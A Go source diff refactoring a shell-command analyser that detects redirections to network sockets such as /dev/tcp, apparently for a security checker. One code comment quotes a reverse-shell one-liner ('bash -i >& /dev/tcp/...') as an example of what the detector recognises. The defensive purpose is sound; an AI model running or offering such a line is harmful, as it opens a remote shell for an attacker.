@@ -41,26 +41,27 @@ func socketRedirects(commands []Command) [][]SocketRedirect {
 		c := &commands[i]
 		// Only a bare exec's redirections outlast the command: by any path, as every program.
 		keeps := len(c.Argv) == 1 && programOf(commandBase(c.Argv[0])) == "exec"
-		for k, r := range c.Redirects {
+		for k := range c.Redirects {
+			r := &c.Redirects[k]
 			found := SocketRedirect{Op: SocketWrite}
-			switch r.Op {
-			case ">", ">>", ">|", "&>", "&>>":
-			case "<":
+			kind := r.kind()
+			switch kind {
+			case redirHereDoc, redirHereString:
+				continue
+			case redirIn, redirDupIn:
 				found.Op = SocketRead
-			case "<>":
+			case redirInOut:
 				found.Op = SocketReadWrite
-			case ">&", "<&":
+			case redirDupOut:
 				// A copy onto standard input reads from the socket (`bash -i >& /dev/tcp/h/1 0>&1`).
-				if r.Op == "<&" || descriptor(r) == "0" {
+				if r.descriptor() == "0" {
 					found.Op = SocketRead
 				}
-			default:
-				continue // a here-document or a here-string
 			}
 			found.Path = redirectSocket(commands, open, i, k)
 			if keeps {
 				// An empty path closes the descriptor, or says it now names something else.
-				open = append(open, openDescriptor{shell: c.shell, fd: descriptor(r), from: c.Offset, to: c.execEnd, path: found.Path})
+				open = append(open, openDescriptor{shell: c.shell, fd: r.descriptor(), from: c.Offset, to: c.execEnd, path: found.Path})
 			}
 			if found.Path == "" {
 				continue
@@ -110,9 +111,9 @@ type openDescriptor struct {
 func redirectSocket(commands []Command, open []openDescriptor, i, k int) string {
 	r := &commands[i].Redirects[k]
 	target := r.Target.Unquoted
-	number, isNumber := descriptorNumber(target)
-	switch {
-	case (r.Op == ">&" || r.Op == "<&") && (isNumber || target == "-"):
+	switch kind := r.kind(); {
+	case (kind == redirDupOut || kind == redirDupIn) && isDescriptor(target):
+		number := strings.TrimSuffix(target, "-")
 		if earlier := lastRedirect(&commands[i], number, k); earlier >= 0 {
 			return redirectSocket(commands, open, i, earlier)
 		}
@@ -167,7 +168,7 @@ func descriptorSocket(commands []Command, open []openDescriptor, i int, fd strin
 // descriptor fd, or -1.
 func lastRedirect(c *Command, fd string, n int) int {
 	for k := n - 1; k >= 0; k-- {
-		if descriptor(c.Redirects[k]) == fd {
+		if c.Redirects[k].descriptor() == fd {
 			return k
 		}
 	}
@@ -183,24 +184,6 @@ func isLastStage(commands []Command, i int) bool {
 		}
 	}
 	return true
-}
-
-// descriptorNumber reads the target of >& or <& as a descriptor: digits, with the - that moves it.
-func descriptorNumber(target string) (string, bool) {
-	number := strings.TrimSuffix(target, "-")
-	return number, number != "" && strings.Trim(number, "0123456789") == ""
-}
-
-// descriptor is the descriptor a redirection is of: the one written before the operator, or
-// the operator's own (standard input for < and <>, standard output otherwise).
-func descriptor(r Redirect) string {
-	switch {
-	case r.Fd != "":
-		return r.Fd
-	case strings.HasPrefix(r.Op, "<"):
-		return "0"
-	}
-	return "1"
 }
 
 // isSocketPath reports whether a redirection's target, as written, is a network pseudo-file.
